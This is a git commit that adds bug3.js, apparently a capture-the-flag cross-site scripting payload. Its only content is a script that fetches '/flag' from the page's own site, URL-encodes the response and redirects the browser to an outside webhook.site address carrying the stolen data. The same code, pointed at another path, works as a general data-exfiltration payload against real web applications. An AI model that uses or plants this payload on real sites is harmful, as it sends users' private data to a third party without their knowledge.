fc09d17380b095b5b729909dc781b613702a6970
Nelson <78611909+nelsondurairaj@users.noreply.github.com>
2023-03-05 10:51:43 +0530

    Create bug3.js

---
+++ bug3.js
@@ -0,0 +1,16 @@
+async function sendFlagToWebhook(webhookUrl) {
+  try {
+    const response = await fetch('/flag');
+    const data = await response.text();
+    console.log(data);
+
+    const encodedData = encodeURIComponent(data);
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
+
+    document.location = urlWithQueryParams;
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+sendFlagToWebhook('https://webhook.site/fb60a38b-3b1c-430e-8483-82bf813f39f1');
